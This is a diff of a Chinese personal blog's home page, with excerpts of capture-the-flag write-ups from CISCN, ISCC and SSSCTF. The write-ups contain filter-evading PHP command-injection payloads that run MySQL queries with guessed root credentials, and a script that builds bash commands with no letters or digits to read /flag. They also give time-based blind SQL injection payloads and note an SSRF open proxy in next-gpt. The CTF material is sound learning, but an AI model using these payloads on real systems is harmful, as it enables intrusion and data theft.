@@ -1,886 +1,750 @@
+
 <!DOCTYPE html>
 <html lang="zh-cn">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
-    <meta name="referrer" content="origin">
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <meta http-equiv="Cache-Control" content="no-transform">
-    <meta http-equiv="Cache-Control" content="no-siteapp">
-    <title>
-        
-            Live For Code
-        
-    </title>
-    <link rel="shortcut icon" href="#"/>
+    <meta charset="utf-8" />
+    <title>dyinglight&#39;s blog</title>
+    <meta name="author" content="dyinglight" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
 
-    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
-    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
-    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
-    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
-    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
-    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
-    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
-    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
-    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
-    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
 
-    <link type="text/css" rel="stylesheet" href="/css/base.css">
-    <link type="text/css" rel="stylesheet" href="/css/code.css">
 
-    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+<script src="/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/css/main.css" />
+
 <meta name="generator" content="Hexo 7.1.1"></head>
 <body>
-    <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/index.css">
-<div id="count"></div>
-<div id="header" >
-    <div class="vertical">
-        <div class="inner">
-            
-                <h1 class="header-title">Dyinglight</h1>
-                <h2 class="header-description" id="hitokoto"></h2>
-                <h3 class="header-info" id="hitokotoAuthor"></h3>
-            
-        </div>
-    </div>
-    
-        <a class="scroll-down" href="javascript:;" target="_self" data-offset="-45">
-            <i class="scroll-down-icon iconfont icon-return"></i>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>DYINGLIGHT&#39;S BLOG</span>
         </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;DYINGLIGHT&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div id="home-head">
+    <div
+        id="home-background"
+        ref="homeBackground"
+        data-images="/images/background.jpg"
+    ></div>
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>dyinglight&#39;s blog</h1>
+                <h3></h3>
+                <h5></h5>
+            </div>
+        </span>
+    </div>
+</div>
+<div
+    id="home-posts-wrap"
+    ref="homePostsWrap"
+    true
+>
+    <div id="home-posts">
+        
+
+<div class="post">
+    <a href="/article/2908473467/">
+        <h2 class="post-title">ciscn-wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/18
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="ciscn-writeup"><a href="#ciscn-writeup" class="headerlink" title="ciscn writeup"></a>ciscn writeup</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="simple-php（复现）"><a href="#simple-php（复现）" class="headerlink" title="simple_php（复现）"></a>simple_php（复现）</h3><p>比赛的时候一直在尝试其他命令，看了wp才发现能用php -r ‘代码’来执行php语句或者系统命令</p>
+<p>与此相似的还有<code>php -i</code>可以查看phpinfo等等</p>
+<p>但是由于题目过滤了许多关键字，我们可以利用hex2bin转码绕过过滤</p>
+<p>hex2bin(‘语句’);	但是由于过滤了引号，使用substr截取一个字符(这里是下划线)，剩下的就会被识别为字符串</p>
+<p>hex编码	ls &#x2F;    -&gt; 6c73202f</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_6c73202f,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/1.png"></p>
+<p>命令成功执行</p>
+<p>之后找了一圈没发现flag，ps -def指令可以查看进程</p>
+<p>ps -def -&gt; _7073202d646566</p>
+<p><img src="/../images/ciscn/2.png"></p>
+<p>其中看到了mysql,flag应该在数据库中</p>
+<p>直接猜账户root密码为root, -e执行sql语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p<span class="string">&#x27;root&#x27;</span> -e <span class="string">&#x27;show databases;&#x27;</span></span><br><span class="line">cmd=php -r system(hex2bin(substr(_6d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27,1)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/3.png"></p>
+<p>有PHP_CMS information_schema mysql performance_schema test这几个库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;use PHP_CMS;show tables;&#x27;`</span><br><span class="line">#注意sql语句用反引号执行</span><br><span class="line">#结果Tables_in_PHP_CMS F1ag_Se3Re7</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;select * from F1ag_Se3Re7&#x27;`</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/4.png"></p>
+<p>拿到flag!</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/article/2908473467/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/article/479963934/">
+        <h2 class="post-title">ISCC-wp-dyinglight</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/1
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="ISCC-WP-Dyinglight"><a href="#ISCC-WP-Dyinglight" class="headerlink" title="ISCC-WP-Dyinglight"></a>ISCC-WP-Dyinglight</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1-还没想好名字的塔防游戏"><a href="#1-还没想好名字的塔防游戏" class="headerlink" title="1.还没想好名字的塔防游戏"></a>1.还没想好名字的塔防游戏</h3><p>hint1:Owls Weave Wisdom</p>
+<p>hint2:Goblins Gather Gold </p>
+<p>hint3:Elves Echo Eternity</p>
+<p>Mystic Defense War: The Secret of Guardian Towers and Magical Monsters</p>
+<p>18&#x3D;MDWTSGTMMOWWGGGEEE</p>
+<h3 id="2-原神启动"><a href="#2-原神启动" class="headerlink" title="2.原神启动"></a>2.原神启动</h3><p>源代码中的注释，用<a target="_blank" rel="noopener" href="http://hi.pcmoe.net/index.html%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%BE%97%E5%88%B0%E6%B0%B4%E5%85%8B%E5%88%B6%E7%81%AB%EF%BC%8C%E7%81%AB%E5%85%8B%E5%88%B6%E5%86%B0%EF%BC%8C%E5%86%B0%E5%85%8B%E5%88%B6%E9%9B%B7%EF%BC%8C%E9%9B%B7%E5%85%8B%E5%88%B6%E8%8D%89%EF%BC%8C%E8%8D%89%E5%85%8B%E5%88%B6%E6%B0%B4">http://hi.pcmoe.net/index.html解密，得到水克制火，火克制冰，冰克制雷，雷克制草，草克制水</a></p>
+<p>输入正确的元素之后，得到success界面，输入flag得知在flag.txt中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;&quot;djkahfakjbnf_32984#@243%&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/article/479963934/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/article/862536289/">
+        <h2 class="post-title">SSSCTFwp-Dyinglight</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/4/27
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="SSSCTF2024-wp-Dyinglight"><a href="#SSSCTF2024-wp-Dyinglight" class="headerlink" title="SSSCTF2024 wp -Dyinglight"></a>SSSCTF2024 wp -Dyinglight</h1><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="原神"><a href="#原神" class="headerlink" title="原神"></a>原神</h3><p>flag{yuanshenqidong} 蒙德文字</p>
+<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h3><p>ida进去就能看到flag</p>
+<p><img src="/../images/sssctf/QQ%E6%88%AA%E5%9B%BE20240427091501.png"></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1-ravenfield"><a href="#1-ravenfield" class="headerlink" title="1.ravenfield"></a>1.ravenfield</h3><p><img src="/../images/sssctf/2.png"></p>
+<p>﻿‎下载了个编码的插件，发现utf-8编码会显示you win，但是源代码中间空了很多点点，把这些点点复制到浏览器，发现了这篇文章</p>
+<p>﻿‏<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38805084/article/details/102682864">https://blog.csdn.net/qq_38805084/article/details/102682864</a></p>
+<p>0‍‍宽字节隐写，﻿<a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/%E8%BF%99%E4%B8%AA%E2%80%8C%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%8A%8Ayou">https://yuanfux.github.io/zero-width-web/这个‌网站可以解密，把you</a> win复制进来解密即可</p>
+<p>﻿‎‍﻿﻿‍﻿‎<img src="/../images/sssctf/3.png">‏‍﻿‌‌‎‍﻿﻿‏‍﻿‎﻿‍﻿﻿‎‏‌‎﻿‍﻿‎﻿‏‏‌‎‍‍﻿‎﻿‎‍‌‌﻿﻿‏﻿﻿‎‏‏‎‎</p>
+<p>ps:游戏真好玩)</p>
+<h3 id="2-weirdbash-复现"><a href="#2-weirdbash-复现" class="headerlink" title="2.weirdbash(复现)"></a>2.weirdbash(复现)</h3><p>dutctf获得一长串提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*</span><br><span class="line">noob-noob?noob-noob!noob$noob%noob-noob!noob%noob*noob-noob!noob*noob-noob!noob?noob&amp;noob*noob-noob!noob%noob*noob!noob-noob!noob%noob&amp;noob*noob-noob!noob$noob%noob&amp;noob*noob!noob-noob!noob?noob%noob-noob!noob$noob%noob&amp;noob*noob!noob-noob!noob?noob%noob-noob!noob$noob-noob!noob%noob*noob!noob!noob&amp;noob!noob$noob%noob&amp;noob*noob-noob!noob$noob%noob&amp;noob-noob!noob$noob%noob&amp;noob*noob-noob!noob$noob%noob&amp;noob*noob-noob!noob&amp;noob!noob&amp;noob!noob-noob!noob?noob&amp;noob-noob!noob$noob%noob&amp;noob*noob-noob!noob?noob%noob*noob-noob!noob?noob%noob-noob!noob%noob*noob!noob-noob!noob?noob%noob-noob!noob$noob%noob&amp;noob*noob!noob-noob!noob&amp;noob*noob-noob!noob*noob-noob!noob?noob-noob!noob?noob%noob-noob!noob?noob%noob*noob-noob!noob?noob&amp;noob-noob!noob%noob*noob!noob-noob!noob?noob%noob-noob!noob$noob-noob!noob%noob*noob!noob-noob!noob%noob&amp;noob-noob!noob$noob%noob-noob!noob*noob-noob!noob%noob&amp;noob*noob!noob$noob%noob&amp;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+-!? $%&amp;* 是标准顺序1111 1111</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">noob_encode</span>(<span class="params">input_string</span>):</span><br><span class="line">    encodeed_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> input_string:</span><br><span class="line">        ascii_value = <span class="built_in">ord</span>(char)</span><br><span class="line">        binary_representation = <span class="string">&#x27;&#123;0:08b&#125;&#x27;</span>.<span class="built_in">format</span>(ascii_value)</span><br><span class="line">        encodeed_char = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> bit, operator <span class="keyword">in</span> <span class="built_in">zip</span>(binary_representation, [<span class="string">&#x27;noob+&#x27;</span>, <span class="string">&#x27;noob-&#x27;</span>, <span class="string">&#x27;noob!&#x27;</span>, <span class="string">&#x27;noob?&#x27;</span>, <span class="string">&#x27;noob$&#x27;</span>, <span class="string">&#x27;noob%&#x27;</span>, <span class="string">&#x27;noob&amp;&#x27;</span>, <span class="string">&#x27;noob*&#x27;</span>]):</span><br><span class="line">            <span class="keyword">if</span> bit == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                encodeed_char += operator</span><br><span class="line">        encodeed_string += encodeed_char</span><br><span class="line">    <span class="keyword">return</span> encodeed_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">noob_decode</span>(<span class="params">encodeed_string</span>):</span><br><span class="line">    decodeed_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(encodeed_string):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            check_valid_noob_string(encodeed_string[i:])</span><br><span class="line">            decodeed_char = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> operator <span class="keyword">in</span> [<span class="string">&#x27;noob+&#x27;</span>, <span class="string">&#x27;noob-&#x27;</span>, <span class="string">&#x27;noob!&#x27;</span>, <span class="string">&#x27;noob?&#x27;</span>, <span class="string">&#x27;noob$&#x27;</span>, <span class="string">&#x27;noob%&#x27;</span>, <span class="string">&#x27;noob&amp;&#x27;</span>, <span class="string">&#x27;noob*&#x27;</span>]:</span><br><span class="line">                <span class="keyword">if</span> encodeed_string.startswith(operator, i):</span><br><span class="line">                    decodeed_char += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                    i += <span class="built_in">len</span>(operator)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    decodeed_char += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            ascii_value = <span class="built_in">int</span>(decodeed_char, <span class="number">2</span>)  <span class="comment"># 转换为2进制</span></span><br><span class="line">            decodeed_string += <span class="built_in">chr</span>(ascii_value)</span><br><span class="line">        <span class="keyword">except</span> DecodeError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">raise</span> DecodeError</span><br><span class="line">    <span class="keyword">return</span> decodeed_string</span><br></pre></td></tr></table></figure>
+
+<p>根据完整的加解密代码，逻辑是先把字符串ascii转化为八位二进制(例如0000 0000)，然后分别用<code>&#39;noob+&#39;, &#39;noob-&#39;, &#39;noob!&#39;, &#39;noob?&#39;, &#39;noob$&#39;, &#39;noob%&#39;, &#39;noob&amp;&#39;, &#39;noob*&#39;</code>去替换这八个数字中的1，得到加密的字符串</p>
+<p>解密的逻辑就是把noob串遍历，有对应的字符就加1，没有就加0，得到二进制串，再翻译为ascii码即可</p>
+<p>解密后的结果为：Please go to the “&#x2F;noob” route to capture the flag.</p>
+<p>进入&#x2F;noob路由，经过测试过滤了所有的字母数字，还有&amp;,&#x3D;,~,_</p>
+<p><img src="/../images/sssctf/bash%E8%BF%87%E6%BB%A4.PNG"></p>
+<p>自己做题的时候一直在用异或绕过的方向，但是命令似乎并不会被解析</p>
+<p>利用脚本绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> cmdx <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>((<span class="built_in">oct</span>(<span class="built_in">ord</span>(cmdx)))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span></span><br><span class="line">    ct = <span class="built_in">str</span>.replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ct = <span class="string">&#x27;$&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span> + ct + <span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line">    charset = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> ctx <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">if</span> ctx.isprintable() <span class="keyword">and</span> ctx <span class="keyword">not</span> <span class="keyword">in</span> charset:</span><br><span class="line">            charset.add(ctx)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc(<span class="string">&quot;cat /flag&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><code>$&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\&lt;\&lt;\&lt;\$\&#39;\\$(($(($&lt;&lt;$))#$$$$$$))\\$(($(($&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$$$&lt;&lt;$))#$$$$$$&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$$$))\&#39;</code></p>
+<p>加密成noob再执行即可(多等会儿)</p>
+<p>本质上是利用$#进行构造，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EH4iuPNbmxG=DuYD&alichlgref=https://cn.bing.com/#toc-0">参考文章</a></p>
+<h3 id="3-app-没做出来"><a href="#3-app-没做出来" class="headerlink" title="3.app(没做出来)"></a>3.app(没做出来)</h3><p>扫描到config：{“key”:”quOKHlGWut9iJUFvDi0CoKwqN1dw0z4zsul5IGdvvpc&#x3D;”,”iv”:”nsmz&#x2F;N5vMhnUaF&#x2F;hSvAP8w&#x3D;&#x3D;”}</p>
+<p>gallery:[{“id”:1,”url”:”&#x2F;img&#x2F;1.jpg”},{“id”:2,”url”:”&#x2F;img&#x2F;2.jpg”},{“id”:3,”url”:”&#x2F;img&#x2F;3.png”}]</p>
+<h3 id="4-gpt-复现"><a href="#4-gpt-复现" class="headerlink" title="4.gpt(复现)"></a>4.gpt(复现)</h3><p>首先是sql时间盲注入，<code>username=1&amp;password=1&#39;+||+if(ascii(substr(database(),1))=115,sleep(2),1)%23</code></p>
+<p>注出数据库名为sssctf2024_db</p>
+<p>由于or被ban了，用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_flattened_keys</span><br><span class="line">schema_auto_increment_columns#该视图的作用简单来说就是用来对表自增ID的监控,可以通过该视图获取数据库的表名信息。</span><br><span class="line">schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer<span class="operator">/</span><span class="operator">/</span>没有自增数据</span><br><span class="line">mysql.innodb_table_stats、mysql.innodb_table_index</span><br></pre></td></tr></table></figure>
+
+<p>可以替换information_schema，得到表名<code>sssctf2024_users</code>(这些表没有列名)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+||+if(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=&#x27;</span>sssctf2024_db<span class="string">&#x27; limit 0,1),1))=115,sleep(5),0)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>查列名，可以使用无列名注入</p>
+<p><code>select 1,2,3  union select * from sssctf2024_users</code>会产生一个虚拟表(必须保证列数正确)</p>
+<p>只要给虚拟表取一个别名n，即可查询其中的数据，下面查询了第二列的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 反引号<span class="number">2</span>反引号 <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n;</span><br></pre></td></tr></table></figure>
+
+<p>在反引号被过滤时还可以使用给列起别名的方式查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n;</span><br></pre></td></tr></table></figure>
+
+<p>还可以使用<code>表名.列名</code>这种形式，n是我们给虚拟表起的别名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> n<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n;</span><br></pre></td></tr></table></figure>
+
+<p>故可以用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+||+if(ascii(substr((select n.2 from (select 1,2,3 union select * from sssctf2024_users)n limit 0,1),1))=115,sleep(5),0)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>查到列名为username,password，注出数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+||+if(ascii(substr((select username from sssctf2024_db.sssctf2024_users limit 0,1),1))=115,sleep(5),0)%23</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Scr1w_admin,sssctf2024_P@ssvv0rd</span><br></pre></td></tr></table></figure>
+
+<p>登陆进去发现</p>
+<p><img src="/../images/sssctf/gpt.png"></p>
+<p>flag生成的是假的，next-gpt能搜索到一个ssrf漏洞</p>
+<p>但是，有一些暴露的服务器端点。其中一个端点位于&#x2F;API&#x2F;cors，它的功能设计为开放代理，允许未经身份验证的用户通过它发送任意HTTP请求。添加此端点似乎是为了支持将客户端聊天数据保存到WebDAV服务器。此端点的存在是一种反模式：它允许客户端绕过内置的浏览器保护，通过服务器端端点访问跨域资源。</p>
